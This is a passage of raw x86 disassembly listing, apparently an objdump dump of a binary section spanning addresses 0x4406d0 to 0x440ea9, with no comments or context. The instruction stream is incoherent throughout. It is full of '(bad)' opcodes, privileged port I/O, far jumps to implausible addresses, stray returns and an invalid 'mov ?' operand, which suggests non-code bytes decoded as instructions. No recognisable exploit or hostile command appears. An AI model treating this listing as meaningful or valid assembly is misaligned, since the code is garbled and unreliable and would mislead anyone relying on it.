  4406d0:	scas   eax,DWORD PTR es:[edi]
  4406d1:	fidiv  WORD PTR [esi+0x3]
  4406d4:	add    bl,ch
  4406d6:	and    al,0x27
  4406d8:	popa   
  4406d9:	xor    esi,ecx
  4406db:	xchg   DWORD PTR [edi+0x5a],eax
  4406de:	jmp    0x7a08eaac
  4406e3:	xchg   ebx,eax
  4406e4:	mov    bh,0x4c
  4406e6:	jo     0x4406eb
  4406e8:	test   DWORD PTR [edx-0x5a720a27],edx
  4406ee:	and    edi,ebp
  4406f0:	add    esp,DWORD PTR [edx+0x51]
  4406f3:	in     eax,0x14
  4406f5:	fist   WORD PTR [ebx]
  4406f7:	mov    esi,0x72c5aa04
  4406fc:	mov    ebx,0xc314e71
  440701:	in     al,0x48
  440703:	jo     0x44071e
  440705:	(bad)  
  440706:	fldenv [ecx+0x17]
  440709:	pop    ebx
  44070a:	dec    esi
  44070b:	jns    0x44078c
  44070d:	push   ebx
  44070e:	fldl2t 
  440710:	mov    ds,WORD PTR [eax+0x6d]
  440713:	call   0xf96c78f3
  440718:	in     eax,dx
  440719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44071a:	repnz call 0x90:0x820bde32
  440722:	adc    edi,ecx
  440724:	jns    0x4406b2
  440726:	in     eax,0x1c
  440728:	iret   
  440729:	add    esp,DWORD PTR [edx+0x4e]
  44072c:	mov    ah,0x3f
  44072e:	inc    ebx
  44072f:	push   eax
  440730:	mov    eax,ds:0xe9d9737b
  440735:	cs je  0x44072b
  440738:	bound  edi,QWORD PTR [edi-0x43]
  44073b:	fdivr  st(3),st
  44073d:	add    esp,DWORD PTR [edx-0xd]
  440740:	sbb    ch,BYTE PTR [edx]
  440742:	out    0x50,al
  440744:	ins    DWORD PTR es:[edi],dx
  440745:	sbb    DWORD PTR [edx-0x27],esp
  440748:	mov    edi,0xf720aa0c
  44074d:	add    esp,DWORD PTR [edx-0x2a]
  440750:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440751:	cmp    esp,esp
  440753:	popa   
  440754:	dec    ebp
  440755:	sbb    DWORD PTR [edx-0x27],esp
  440758:	ret    0xe456
  44075b:	scas   al,BYTE PTR es:[edi]
  44075c:	std    
  44075d:	adc    DWORD PTR [ebx],edx
  44075f:	bound  esi,QWORD PTR [edi]
  440761:	or     eax,0x3600d962
  440766:	push   ecx
  440767:	fld    DWORD PTR [eax]
  440769:	jmp    0x34cd57aa
  44076e:	pop    bp
  440770:	mov    BYTE PTR [ebp+0x1200d978],bl
  440776:	mov    bl,0xd2
  440778:	pop    edi
  440779:	fimul  WORD PTR [edx+0x61f3b468]
  44077f:	(bad)  [ecx-0x2c45cdec]
  440785:	retf   
  440786:	add    bh,ah
  440788:	mov    al,ds:0x3d256008
  44078d:	pop    esi
  44078e:	lock rcl DWORD PTR [eax+0x5e61e90e],1
  440795:	push   eax
  440796:	std    
  440797:	out    0xd8,eax
  440799:	mov    eax,0x88d961f7
  44079e:	in     eax,dx
  44079f:	jo     0x4407ff
  4407a1:	cmp    eax,0xcb16185
  4407a6:	(bad)  
  4407a7:	imul   ah
  4407a9:	mov    esp,DWORD PTR [ecx]
  4407ab:	pop    esi
  4407ac:	pop    edi
  4407ad:	nop
  4407ae:	mov    al,ds:0x7100d948
  4407b3:	jp     0x440797
  4407b5:	mov    edi,DWORD PTR [ecx-0x1e]
  4407b8:	jmp    0xe8e4:0xd3dee900
  4407bf:	test   eax,0x8fd9b1ec
  4407c4:	push   ds
  4407c5:	pop    esi
  4407c6:	sbb    dh,BYTE PTR [ebx]
  4407c8:	pop    ebp
  4407c9:	inc    ebp
  4407ca:	xor    ebp,ebx
  4407cc:	lods   al,BYTE PTR ds:[esi]
  4407cd:	or     bl,BYTE PTR [ecx]
  4407cf:	fldcw  WORD PTR [eax-0x4c]
  4407d2:	mul    DWORD PTR [ecx-0x27]
  4407d5:	mov    edi,DWORD PTR [ebp+edx*4-0x31ae7646]
  4407dc:	jmp    0x660e:0x53b0000
  4407e3:	mov    al,0xd5
  4407e5:	mov    ebx,0x62dc4b0a
  4407ea:	rol    DWORD PTR [eax],cl
  4407ec:	fs cmp esi,0xffffffb7
  4407f0:	add    esi,edx
  4407f2:	add    BYTE PTR [eax],al
  4407f4:	or     BYTE PTR [edi],ah
  4407f6:	out    dx,eax
  4407f7:	mov    DWORD PTR [ebx-0x4ffee28],eax
  4407fd:	fs jg  0x4407bc
  440800:	and    eax,0xc98300dc
  440805:	push   ss
  440806:	jne    0x440801
  440808:	std    
  440809:	sbb    DWORD PTR [ebx-0x77],ebx
  44080c:	push   esi
  44080d:	or     DWORD PTR [edx-0x2d],esp
  440810:	fldenv [edi+edi*1+0x8]
  440814:	push   edx
  440815:	pop    ds
  440816:	jecxz  0x44087e
  440818:	ret    0xaf6b
  44081b:	push   ss
  44081c:	mov    ebx,0xa7507ddb
  440821:	gs ja  0x4407dc
  440824:	xchg   ebp,eax
  440825:	fild   DWORD PTR [eax]
  440827:	mov    bh,al
  440829:	jmp    0x1458:0xdae7457d
  440830:	xor    BYTE PTR [ebx+edx*1+0x11d31b8a],dl
  440837:	add    BYTE PTR [ebx+0x3083f64],cl
  44083d:	lock or DWORD PTR [ebx+0x11d82b],ecx
  440844:	mov    esp,DWORD PTR [edx+edi*2-0x14]
  440848:	mov    dh,BYTE PTR [ebx]
  44084a:	adc    esi,DWORD PTR [ecx+0x66bd458b]
  440850:	add    BYTE PTR [eax],ch
  440852:	or     DWORD PTR [ebp-0x3e],esi
  440855:	jns    0x4408ba
  440857:	xchg   DWORD PTR [edx+eiz*2-0x3bfffcaa],edi
  44085e:	mov    ecx,0x406cb77b
  440863:	add    esp,edi
  440865:	xchg   edx,eax
  440866:	inc    edx
  440867:	add    eax,DWORD PTR [eax]
  440869:	mov    esp,0x5b611df3
  44086e:	mov    al,0x7b
  440870:	adc    DWORD PTR [edx+0x40],esp
  440873:	cmp    BYTE PTR [esi-0x20bd6a0],0x15
  44087a:	inc    ecx
  44087b:	jbe    0x44088c
  44087d:	bound  eax,QWORD PTR [eax+0x3]
  440880:	jge    0x44088a
  440882:	dec    ebx
  440883:	push   es
  440884:	mov    DWORD PTR [ebx+0x41],ebx
  440887:	add    eax,DWORD PTR [eax]
  440889:	xlat   BYTE PTR gs:[ebx]
  44088b:	test   BYTE PTR [ebp+0x25034058],bh
  440891:	jmp    0x44085c
  440893:	shl    edi,1
  440895:	jmp    0x62558962
  44089a:	inc    eax
  44089b:	cli    
  44089c:	enter  0xdf4c,0x7
  4408a0:	mov    cl,0xf2
  4408a2:	or     BYTE PTR [edx],0x0
  4408a5:	(bad)  
  4408a6:	leave  
  4408a7:	fldpi  
  4408a9:	cmp    al,0x73
  4408ab:	and    al,BYTE PTR [edx+ebx*1-0x41bd7bc8]
  4408b2:	es add al,0x90
  4408b5:	add    dl,bl
  4408b7:	dec    esi
  4408b8:	add    eax,DWORD PTR [eax]
  4408ba:	jmp    0xe2ca184f
  4408bf:	push   0xc862000e
  4408c4:	or     BYTE PTR [edi],cl
  4408c6:	jmp    0xe422848
  4408cb:	xor    al,0x8a
  4408cd:	ja     0x440925
  4408cf:	mov    ebx,0xd9d807c4
  4408d4:	jns    0x440953
  4408d6:	jae    0x4408b1
  4408d8:	jmp    0x632a7a68
  4408dd:	xchg   esp,eax
  4408de:	or     edi,ebp
  4408e0:	jmp    0xe17e7e8
  4408e5:	add    eax,0x1438ed9a
  4408ea:	jl     0x44090f
  4408ec:	xchg   DWORD PTR [edx+0x3a],edx
  4408ef:	bound  edx,QWORD PTR [ebx+edi*1+0x33f3acd8]
  4408f6:	in     al,0x68
  4408f8:	xchg   ebp,eax
  4408f9:	adc    eax,0xd862d962
  4408fe:	or     DWORD PTR [edi-0x113284a0],edi
  440904:	jmp    0x403d100c
  440909:	mov    ebp,DWORD PTR [ebp+0x6203e318]
  44090f:	mov    edi,0x60de269a
  440914:	pop    ebp
  440915:	adc    eax,0xcffd962
  44091a:	add    BYTE PTR [edx],bl
  44091c:	xchg   ecx,eax
  44091d:	test   DWORD PTR [ebx],0x3c14da62
  440923:	fsub   QWORD PTR [eax+0x3d]
  440926:	adc    eax,0x8b72d962
  44092b:	stc    
  44092c:	out    dx,al
  44092d:	jmp    0x645f3835
  440932:	sub    BYTE PTR [ebx+eiz*8-0x541b2021],0x45
  44093a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44093b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44093c:	cmp    ah,BYTE PTR [edx-0x35]
  44093f:	gs pusha 
  440941:	pushf  
  440942:	daa    
  440943:	add    esp,eax
  440945:	pop    ecx
  440946:	jnp    0x44099b
  440948:	fldl2t 
  44094a:	mov    ah,BYTE PTR ds:0xe16300ed
  440950:	lea    ecx,[esi]
  440952:	jmp    0xf8406ab8
  440957:	call   0x3a2ce5f3
  44095c:	jmp    0x5bb99aec
  440961:	nop
  440962:	push   eax
  440963:	outs   dx,DWORD PTR ds:[esi]
  440964:	fld    DWORD PTR [eax]
  440966:	jb     0x440991
  440968:	fisttp QWORD PTR [eax-0x6fa19b2b]
  44096e:	xor    eax,0x6200d957
  440973:	and    al,BYTE PTR [ecx+0x1]
  440976:	inc    ecx
  440977:	jp     0x4408fd
  440979:	adc    BYTE PTR [ebx],dl
  44097b:	test   al,0xba
  44097d:	rol    esi,cl
  44097f:	add    bl,ah
  440981:	xchg   esi,eax
  440982:	repz pusha 
  440984:	out    dx,al
  440985:	nop
  440986:	push   cs
  440987:	jmp    0x81cdc0ed
  44098c:	jbe    0x440978
  44098e:	add    cl,ch
  440990:	cmp    bl,bh
  440992:	add    ecx,ebp
  440994:	popa   
  440995:	mov    bh,0xd3
  440997:	mov    eax,DWORD PTR [esp+ebx*8]
  44099a:	nop
  44099b:	popa   
  44099c:	ins    BYTE PTR es:[edi],dx
  44099d:	fld    DWORD PTR [eax]
  44099f:	push   0x21
  4409a1:	push   ebp
  4409a2:	call   0x11d6a9f
  4409a7:	div    BYTE PTR [esi]
  4409a9:	pop    esp
  4409aa:	mov    esi,0x2bd961f3
  4409af:	jo     0x44098a
  4409b1:	lahf   
  4409b2:	clc    
  4409b3:	(bad)  
  4409b4:	(bad)  
  4409b5:	nop
  4409b6:	push   cs
  4409b7:	jmp    0xe00c181d
  4409bc:	mov    esi,0x1a79afe1
  4409c1:	fiadd  WORD PTR [eax]
  4409c3:	jmp    0x128b1a0
  4409c8:	lods   eax,DWORD PTR ds:[esi]
  4409c9:	test   eax,0xe0b38bd5
  4409ce:	jg     0x440a15
  4409d0:	pop    ds
  4409d1:	jnp    0x4409d1
  4409d3:	(bad)  
  4409d4:	repz jmp 0x8a13:0x2dd00000
  4409dc:	retf   
  4409dd:	aad    0x11
  4409df:	add    BYTE PTR [ebx],bh
  4409e1:	pusha  
  4409e2:	add    edx,DWORD PTR [ecx]
  4409e4:	add    al,al
  4409e6:	sbb    al,0xe3
  4409e8:	add    DWORD PTR [ebx],eax
  4409ea:	in     al,dx
  4409eb:	jge    0x440a65
  4409ed:	punpcklwd mm7,DWORD PTR [edi]
  4409f0:	or     cl,al
  4409f2:	ins    DWORD PTR es:[edi],dx
  4409f3:	scas   al,BYTE PTR es:[edi]
  4409f4:	push   ss
  4409f5:	cmp    ebx,eax
  4409f7:	mov    BYTE PTR [esp+edx*1],dl
  4409fa:	popa   
  4409fb:	xchg   DWORD PTR [ebp+ecx*1-0x4974ff28],edi
  440a02:	or     edi,esi
  440a04:	push   edi
  440a05:	(bad)  
  440a07:	pop    es
  440a08:	sub    dh,BYTE PTR [ecx+0x70efc47d]
  440a0e:	and    ebp,edi
  440a10:	lea    ecx,[edi-0x21]
  440a13:	lock mov DWORD PTR [ebx-0x34ffee2c],ecx
  440a1a:	pusha  
  440a1b:	push   edx
  440a1c:	cld    
  440a1d:	pop    ebp
  440a1e:	pusha  
  440a1f:	scas   eax,DWORD PTR es:[edi]
  440a20:	mov    eax,0xeb00d7cd
  440a25:	fwait
  440a26:	jge    0x440aa4
  440a28:	mov    eax,0xe20f
  440a2d:	pop    ebp
  440a2e:	stos   BYTE PTR es:[edi],al
  440a2f:	loopne 0x4409bc
  440a31:	inc    ebx
  440a32:	aam    0x11
  440a34:	add    BYTE PTR [ebx-0x3c480183],bh
  440a3a:	in     eax,dx
  440a3b:	add    BYTE PTR [eax],al
  440a3d:	mov    BYTE PTR [edx],ah
  440a3f:	out    dx,eax
  440a40:	mov    DWORD PTR [edx-0x46],esp
  440a43:	ja     0x440a56
  440a45:	bound  eax,QWORD PTR [edx-0x78]
  440a48:	xchg   DWORD PTR [eax],eax
  440a4a:	mov    esi,0xe1000333
  440a4f:	jmp    FWORD PTR [esi]
  440a51:	jl     0x440abe
  440a53:	cmp    BYTE PTR [ebp+0x276cdb56],dh
  440a59:	popa   
  440a5a:	xor    edi,ebx
  440a5c:	mov    BYTE PTR [edi+0x6a],al
  440a5f:	leave  
  440a60:	mov    esi,0x9339c4e3
  440a65:	mov    bh,0x6c
  440a67:	inc    eax
  440a68:	add    eax,DWORD PTR [ebp+0x7f893492]
  440a6e:	cli    
  440a6f:	sub    al,BYTE PTR [ebx]
  440a71:	add    dl,bl
  440a73:	inc    esp
  440a74:	adc    al,BYTE PTR [ebp+0x5802dc9f]
  440a7a:	jbe    0x440a43
  440a7c:	mov    ah,0x13
  440a7e:	call   0x62558053
  440a83:	inc    eax
  440a84:	xchg   BYTE PTR [edi+0x5a],al
  440a87:	mov    eax,0xb0e90910
  440a8c:	js     0x440a9f
  440a8e:	bound  eax,QWORD PTR [eax-0x7a]
  440a91:	jp     0x440a91
  440a93:	inc    ecx
  440a94:	fist   DWORD PTR [ebx]
  440a96:	mov    bl,0x30
  440a98:	in     eax,0xc5
  440a9a:	inc    esp
  440a9b:	(bad)  
  440a9c:	sub    edi,DWORD PTR [eax+eiz*4+0x6b]
  440aa0:	test   DWORD PTR [edi+0x3530e],ecx
  440aa6:	cmp    al,0xb9
  440aa8:	je     0x440a61
  440aaa:	push   esp
  440aab:	inc    eax
  440aac:	add    esp,ebp
  440aae:	add    BYTE PTR [ecx-0x26],dl
  440ab1:	dec    edi
  440ab2:	fld    QWORD PTR [ecx+edi*1-0x6d]
  440ab6:	mov    bh,0x4c
  440ab8:	inc    eax
  440ab9:	add    edi,DWORD PTR [ebp-0x5d]
  440abc:	(bad)  
  440abe:	mov    ebp,ds
  440ac0:	xchg   ebp,eax
  440ac1:	out    dx,eax
  440ac2:	add    esp,DWORD PTR [edx+0x5e]
  440ac5:	pushf  
  440ac6:	das    
  440ac7:	ss daa 
  440ac9:	pusha  
  440aca:	mov    cl,0x89
  440acc:	pop    esp
  440acd:	xor    BYTE PTR [ecx+0x473906b],dh
  440ad3:	(bad)  
  440ad4:	fldenv [esi]
  440ad6:	shr    DWORD PTR [ebp-0x2a],0xe9
  440ada:	add    esp,DWORD PTR [edx+0x3e]
  440add:	(bad)  
  440ade:	inc    BYTE PTR [esp+ecx*8-0x19]
  440ae2:	jl     0x440b47
  440ae4:	fldl2t 
  440ae6:	add    esp,DWORD PTR [ebx]
  440ae8:	pushf  
  440ae9:	adc    DWORD PTR [edi],eax
  440aeb:	(bad)  
  440aec:	fldl2t 
  440aee:	imul   edx,DWORD PTR cs:[eax-0x269dfc22],0xdd2dc126
  440af9:	jmp    0x249a6d01
  440afe:	xor    al,0x61
  440b00:	add    BYTE PTR ds:0xad5c5a2c,dh
  440b06:	cmp    eax,0xda26520a
  440b0b:	xchg   esi,eax
  440b0c:	pop    esi
  440b0d:	(bad)  
  440b0e:	fdiv   DWORD PTR [esi+0x47a524]
  440b14:	sbb    DWORD PTR ds:0xa7f98f14,esp
  440b1a:	(bad)  
  440b1b:	shl    BYTE PTR [ebp+0x5e],0x6f
  440b1f:	ja     0x440b94
  440b21:	fldl2t 
  440b23:	(bad)  
  440b24:	pusha  
  440b25:	push   edx
  440b26:	(bad)  
  440b27:	cmp    cl,dl
  440b29:	test   eax,0xd9620452
  440b2e:	jmp    0xf821b7b9
  440b33:	rol    DWORD PTR [ebx+0x5e],1
  440b36:	add    BYTE PTR [ecx+0x62e22503],bl
  440b3c:	stos   DWORD PTR es:[edi],eax
  440b3d:	in     eax,0x89
  440b3f:	lods   al,BYTE PTR ds:[esi]
  440b40:	dec    ebp
  440b41:	mov    eax,0xe8097709
  440b46:	add    cl,ch
  440b48:	aam    0xa7
  440b4a:	or     BYTE PTR [ebx-0x1d],ah
  440b4d:	mov    DWORD PTR [esi],ecx
  440b4f:	jmp    0xd8406cb5
  440b54:	scas   ax,WORD PTR es:[edi]
  440b56:	or     al,0x63
  440b58:	ror    DWORD PTR [edx+0x5661e90e],cl
  440b5e:	jbe    0x440b5d
  440b60:	in     al,0xa2
  440b62:	or     BYTE PTR [edx+0x22],dh
  440b65:	push   ebp
  440b66:	mov    ch,bh
  440b68:	pop    eax
  440b69:	push   esi
  440b6a:	mov    cs,WORD PTR [ebp+0x53]
  440b6d:	fld    DWORD PTR [eax]
  440b6f:	call   0xd9f5f88f
  440b74:	aas    
  440b75:	pop    ss
  440b76:	pop    esi
  440b77:	sbb    al,BYTE PTR [eax]
  440b79:	jns    0x440b48
  440b7b:	ret    0xe9f4
  440b7e:	push   0xffffffb4
  440b80:	jmp    DWORD PTR [ecx-0x27]
  440b83:	pop    esi
  440b84:	jo     0x440b66
  440b86:	mov    BYTE PTR [esi],cl
  440b88:	jmp    0x475741ee
  440b8d:	xchg   edi,eax
  440b8e:	xor    BYTE PTR [esi-0x10],bl
  440b91:	jecxz  0x440b1b
  440b93:	push   cs
  440b94:	jmp    0xed05d9fa
  440b99:	fsub   DWORD PTR [edx-0x4c]
  440b9c:	xlat   BYTE PTR ds:[ebx]
  440b9d:	popa   
  440b9e:	(bad)  [ebx-0x79a995d4]
  440ba4:	pop    ebp
  440ba5:	jo     0x440b80
  440ba7:	add    BYTE PTR [ecx],ah
  440ba9:	fild   WORD PTR [edi+0xb]
  440bac:	seto   BYTE PTR [edx+0x7bdb008b]
  440bb3:	(bad)
  440bb7:	adc    ecx,DWORD PTR [ecx+0x9621176]
  440bbd:	xor    eax,0x8b0011cd
  440bc2:	pop    ebp
  440bc3:	push   ecx
  440bc4:	or     BYTE PTR [ecx],dl
  440bc6:	pop    ebx
  440bc7:	scas   eax,DWORD PTR es:[edi]
  440bc8:	push   ss
  440bc9:	jnp    0x440ba7
  440bcb:	mov    BYTE PTR [edx+edi*2],al
  440bce:	fistp  DWORD PTR [edx+0x14]
  440bd1:	icebp  
  440bd2:	push   0xffffffae
  440bd4:	push   ss
  440bd5:	jnp    0x440bb3
  440bd7:	jge    0x440c57
  440bd9:	xchg   DWORD PTR [ebp+0x49],ebx
  440bdc:	or     BYTE PTR [eax],al
  440bde:	rcl    BYTE PTR [eax-0x1ea87705],0x7d
  440be5:	xchg   esi,eax
  440be6:	scas   eax,DWORD PTR es:[edi]
  440be7:	jmp    0x440be9
  440be9:	add    BYTE PTR [edx],bh
  440beb:	xor    dl,BYTE PTR [ebx]
  440bed:	mov    cl,0x3b
  440bef:	ds mov ebp,0x74fd5866
  440bf5:	ret    0x6336
  440bf8:	xchg   ecx,eax
  440bf9:	mov    esp,0x6600dc05
  440bfe:	sbb    BYTE PTR [ebx-0x51],0x16
  440c02:	or     ebx,esp
  440c04:	fst    QWORD PTR [ebx]
  440c06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440c07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440c08:	xlat   BYTE PTR ds:[ebx]
  440c09:	data16 add bl,BYTE PTR [edx-0x51]
  440c0d:	push   ss
  440c0e:	or     ebx,esp
  440c10:	jne    0x440bd3
  440c12:	push   es
  440c13:	arpl   WORD PTR [ecx+0xdc15bc],cx
  440c19:	mov    esi,DWORD PTR [esi]
  440c1b:	in     eax,0x7d
  440c1d:	mov    cs,WORD PTR [edi-0x16]
  440c20:	add    BYTE PTR [eax],al
  440c22:	dec    eax
  440c23:	pushf  
  440c24:	sti    
  440c25:	add    DWORD PTR [edx],0xffffffd8
  440c28:	jp     0x440c80
  440c2a:	(bad)  
  440c2b:	loopne 0x440bb2
  440c2d:	iret   
  440c2e:	inc    esp
  440c2f:	xchg   ebx,eax
  440c30:	sbb    eax,0x8a2e2484
  440c35:	inc    edx
  440c36:	scas   al,BYTE PTR es:[edi]
  440c37:	xlat   BYTE PTR ds:[ebx]
  440c38:	or     edx,DWORD PTR [edx+0x32fea]
  440c3e:	jmp    0xca112a
  440c43:	fdivr  QWORD PTR [ecx+0x11]
  440c46:	add    BYTE PTR [edx-0x36],ah
  440c49:	test   DWORD PTR [esi],0x86078863
  440c4f:	aam    0x68
  440c51:	adc    DWORD PTR [eax],eax
  440c53:	(bad)  
  440c54:	retf   
  440c55:	mov    ecx,0xb7fd913
  440c5a:	test   DWORD PTR [edi],ebx
  440c5c:	push   es
  440c5d:	mov    WORD PTR [ebx],ss
  440c5f:	ins    DWORD PTR es:[edi],dx
  440c60:	mov    ebx,0x406cbb91
  440c65:	add    edi,edi
  440c67:	scas   eax,DWORD PTR es:[edi]
  440c68:	inc    esp
  440c69:	jb     0x440c7a
  440c6b:	js     0x440c67
  440c6d:	mov    eax,ds:0x3dc44acc
  440c72:	repz jmp 0x440c23
  440c75:	outs   dx,DWORD PTR ds:[esi]
  440c76:	adc    DWORD PTR [edx+0x40],esp
  440c79:	mov    eax,ds:0x1208dc86
  440c7e:	add    BYTE PTR [edx-0x25],ah
  440c81:	or     al,0x62
  440c83:	xor    DWORD PTR [ecx],esp
  440c85:	xchg   esi,eax
  440c86:	push   es
  440c87:	in     al,0x78
  440c89:	push   es
  440c8a:	add    BYTE PTR [edx-0x3d],ah
  440c8d:	cmp    eax,0x78aeeb03
  440c92:	adc    DWORD PTR [edx+0x40],esp
  440c95:	repnz clc 
  440c97:	sub    ecx,DWORD PTR ds:0xa6d4090d
  440c9d:	cld    
  440c9e:	jmp    DWORD PTR [edx-0x45]
  440ca1:	jle    0x440c5e
  440ca3:	ins    BYTE PTR es:[edi],dx
  440ca4:	fldl2t 
  440ca6:	add    eax,DWORD PTR [eax]
  440ca8:	dec    edi
  440ca9:	push   eax
  440caa:	in     al,0xb5
  440cac:	inc    ebx
  440cad:	ficom  WORD PTR [edi-0x71]
  440cb0:	sub    DWORD PTR [edx-0x7994fbd7],ebx
  440cb6:	mov    gs,WORD PTR gs:[ebx]
  440cb9:	jecxz  0x440ca4
  440cbb:	add    eax,DWORD PTR [eax+0x62]
  440cbe:	cdq    
  440cbf:	sahf   
  440cc0:	scas   al,BYTE PTR es:[edi]
  440cc1:	cmp    esp,DWORD PTR [edx-0x3a]
  440cc4:	jno    0x440c7d
  440cc6:	lock (bad) 
  440cc8:	aad    0xe7
  440cca:	jmp    0x6fcb67d2
  440ccf:	jl     0x440d24
  440cd1:	fldl2t 
  440cd3:	mov    dl,BYTE PTR [ebx]
  440cd5:	loope  0x440d48
  440cd7:	sbb    BYTE PTR [ebp+0x4e],bl
  440cda:	lahf   
  440cdb:	cvtdq2ps xmm0,XMMWORD PTR [edi-0x268c82b1]
  440ce2:	jmp    0x7329b871
  440ce7:	into   
  440ce8:	gs popa 
  440cea:	cmc    
  440ceb:	adc    al,0xdf
  440ced:	dec    bp
  440cef:	push   cs
  440cf0:	(bad)  
  440cf1:	fstp   DWORD PTR [eax+0x14]
  440cf4:	jl     0x440d19
  440cf6:	xchg   DWORD PTR [edx+0x45],edx
  440cf9:	xchg   edx,eax
  440cfa:	call   0xe91d6f02
  440cff:	aad    0x71
  440d01:	pop    edx
  440d02:	sub    esi,DWORD PTR [ebx]
  440d04:	and    DWORD PTR [eax+0x67],0x7b
  440d08:	jae    0x440ce3
  440d0a:	jmp    0x8d370d9b
  440d0f:	test   DWORD PTR [ebx],0x70b4262
  440d15:	mov    al,0x55
  440d17:	sub    eax,0x3fd92dc3
  440d1c:	mov    edx,ecx
  440d1e:	push   esi
  440d1f:	add    BYTE PTR [edi],dh
  440d21:	push   0x314700d9
  440d26:	sub    al,0x5e
  440d28:	lock fild WORD PTR [ebp-0x339e16f2]
  440d2f:	shr    edx,0xee
  440d32:	pop    edi
  440d33:	mov    ah,0xf7
  440d35:	popa   
  440d36:	fld    DWORD PTR [ebx]
  440d38:	sub    BYTE PTR [eax-0x2211ef2e],0xab
  440d3f:	div    DWORD PTR [esi+0x54]
  440d42:	push   ebp
  440d43:	inc    ebp
  440d44:	loope  0x440cec
  440d46:	bound  ecx,QWORD PTR [esi+0xd9617d]
  440d4c:	jb     0x440d95
  440d4e:	ss inc ebp
  440d50:	push   ecx
  440d51:	xor    al,0x51
  440d53:	mov    ebx,DWORD PTR [ebp+ebx*2-0x26a07a6a]
  440d5a:	(bad)  
  440d5b:	add    cl,ch
  440d5d:	fcom   DWORD PTR [edi]
  440d5f:	call   0xf795a759
  440d64:	mov    ?,WORD PTR [eax]
  440d66:	push   esi
  440d67:	ffree  st(4)
  440d69:	mov    al,ds:0x9d2dc420
  440d6e:	and    ah,al
  440d70:	mov    esp,0x8340e800
  440d75:	std    
  440d76:	push   eax
  440d77:	sahf   
  440d78:	mov    esp,DWORD PTR [ecx+ebx*2+0x1497c9fe]
  440d7f:	add    al,0x89
  440d81:	dec    ecx
  440d82:	outs   dx,DWORD PTR ds:[esi]
  440d83:	fld    DWORD PTR [eax]
  440d85:	ficom  WORD PTR [ebp+0x61e90085]
  440d8b:	jmp    FWORD PTR ss:[ebx-0x3e]
  440d8f:	clc    
  440d90:	add    BYTE PTR [edx+0x25],ah
  440d93:	dec    ecx
  440d94:	mov    edi,DWORD PTR [ecx-0x7e]
  440d97:	jmp    0x14b1:0xd5fb0000
  440d9e:	xor    DWORD PTR [edx-0x59],esp
  440da1:	cwde   
  440da2:	mov    ebp,0x4d0f00d8
  440da7:	dec    ecx
  440da8:	es inc ecx
  440daa:	push   edx
  440dab:	adc    al,0xf3
  440dad:	mov    edx,DWORD PTR [ebx-0x2f]
  440db0:	adc    DWORD PTR [eax],eax
  440db2:	retf   
  440db3:	pop    edi
  440db4:	push   edx
  440db5:	cld    
  440db6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440db8:	or     BYTE PTR [ebp+0xd7bf],al
  440dbe:	mov    ah,0xbd
  440dc0:	jnp    0x440d75
  440dc2:	mov    edx,edx
  440dc4:	pop    es
  440dc5:	add    BYTE PTR [ebx+0x40d71dd8],cl
  440dcb:	lahf   
  440dcc:	jns    0x440e22
  440dce:	je     0x440d8d
  440dd0:	xor    esi,DWORD PTR [ebx+0x66d161ad]
  440dd6:	add    BYTE PTR [eax],bh
  440dd8:	idiv   DWORD PTR [eax+ecx*2+0x73]
  440ddc:	outs   dx,BYTE PTR ds:[esi]
  440ddd:	dec    BYTE PTR [edi+0xdbe3]
  440de3:	inc    esp
  440de4:	mov    esi,0xd82db88f
  440de9:	add    BYTE PTR [ebx+0x1c88dc0b],cl
  440def:	dec    edx
  440df0:	add    eax,0xbe441438
  440df5:	(bad)  
  440df6:	mov    ecx,0x8b00d82d
  440dfb:	repz fstp TBYTE PTR [ebp+0x50]
  440dff:	xor    esp,DWORD PTR [eax+0x1b]
  440e02:	adc    DWORD PTR [eax+0xb16bb65],eax
  440e08:	fdivr  st,st(1)
  440e0a:	inc    eax
  440e0b:	punpcklwd mm3,DWORD PTR [edx+0x8]
  440e0f:	jmp    0x519c:0x62ca1ee7
  440e16:	jmp    0xf03efc02
  440e1b:	test   cl,cl
  440e1d:	jae    0x440dd6
  440e1f:	dec    esp
  440e20:	inc    edx
  440e21:	add    esp,ebp
  440e23:	jb     0x440dc1
  440e25:	mov    DWORD PTR [ebx],edx
  440e27:	adc    DWORD PTR [ecx+edx*2-0x6cb6bb23],edx
  440e2e:	mov    bh,0x6c
  440e30:	inc    edx
  440e31:	add    edi,ebp
  440e33:	lods   al,BYTE PTR ds:[esi]
  440e34:	mov    eax,0x424cbb8b
  440e39:	add    eax,DWORD PTR [ebp-0x731e100]
  440e3f:	xchg   DWORD PTR [edx],eax
  440e41:	and    al,0x3
  440e43:	add    BYTE PTR [ebp-0x40],ch
  440e46:	enter  0x95f8,0xba
  440e4a:	cld    
  440e4b:	mov    al,0xc9
  440e4d:	aas    
  440e4e:	idiv   edi
  440e50:	test   esi,eax
  440e52:	mov    edi,DWORD PTR [ebx-0x49fcbdac]
  440e58:	push   edx
  440e59:	inc    edx
  440e5a:	add    eax,DWORD PTR [eax]
  440e5c:	cmp    ebx,ebp
  440e5e:	clc    
  440e5f:	lds    edx,FWORD PTR [ebp-0x44]
  440e62:	inc    eax
  440e63:	std    
  440e64:	pop    ebp
  440e65:	inc    ecx
  440e66:	cld    
  440e67:	mov    al,0x11
  440e69:	inc    ecx
  440e6a:	idiv   edi
  440e6c:	dec    ebp
  440e6d:	pop    ebx
  440e6e:	mov    cl,dl
  440e70:	mov    esp,0xaa84220f
  440e75:	cmp    BYTE PTR [ebp+0x5a8d206],dl
  440e7b:	add    BYTE PTR [edx+0x43],ah
  440e7e:	gs xchg edi,eax
  440e80:	jmp    0x770:0xe9000322
  440e87:	mov    BYTE PTR [esi+0x31],dh
  440e8a:	sub    al,0x3f
  440e8c:	jbe    0x440e67
  440e8e:	out    dx,al
  440e8f:	jns    0x440e7e
  440e91:	nop
  440e92:	out    dx,eax
  440e93:	add    esp,DWORD PTR [edx+0x5e]
  440e96:	and    DWORD PTR [eax],ebx
  440e98:	fild   QWORD PTR [ecx-0x17b6841f]
  440e9e:	jb     0x440e34
  440ea0:	add    BYTE PTR [ecx-0x24fc161d],ch
  440ea6:	cdq    
  440ea7:	aad    0x74
  440ea9:	jmp    DWORD PTR gs:[ebx+0x6c3b9eaa]
